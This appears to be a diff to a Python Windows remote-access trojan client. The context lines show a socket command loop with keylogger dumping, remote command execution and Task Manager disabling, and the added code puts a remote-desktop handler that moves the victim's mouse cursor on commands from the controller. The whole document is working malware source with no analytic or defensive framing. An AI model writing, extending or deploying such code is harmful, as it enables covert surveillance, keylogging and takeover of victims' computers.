@@ -1,4 +1,4 @@
-import socket, os, sys, platform, time, ctypes, subprocess, webbrowser, sqlite3
+import socket, os, sys, platform, time, ctypes, subprocess, webbrowser, sqlite3, json
 import win32console, win32gui, win32api, winerror, win32event, win32crypt, win32con, win32ui
 import urllib.request
 from shutil import copyfile
@@ -32,7 +32,6 @@ mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     mutex = None
     sys.exit(0)
-
 
 while True:  # infinite loop until socket can connect
     try:
@@ -366,6 +365,13 @@ def run_command(command):
     objSocket.send(bytData)  # send output
 
 
+def remote_desktop():
+    while True:
+        jsonData = json.loads(objSocket.recv(1024).decode("utf-8"))  # load the json data that was received
+
+        arrMouseState = jsonData.get("mouse_state")  # get the data for the mouse state
+
+        win32api.SetCursorPos((int(arrMouseState[0][0]), int(arrMouseState[0][1])))  # item 0 is x, y cords
 try:
     while True:
         strData = objSocket.recv(1024)
@@ -407,6 +413,8 @@ try:
             keylogger("dump")
         elif strData[:6] == "runcmd":
             run_command(strData[6:len(strData)])
+        elif strData == "rdesktop":
+            remote_desktop()
         elif strData == "dtaskmgr":
             if not "blnDisabled" in globals():  # if the variable doesnt exist yet
                 blnDisabled = "True"
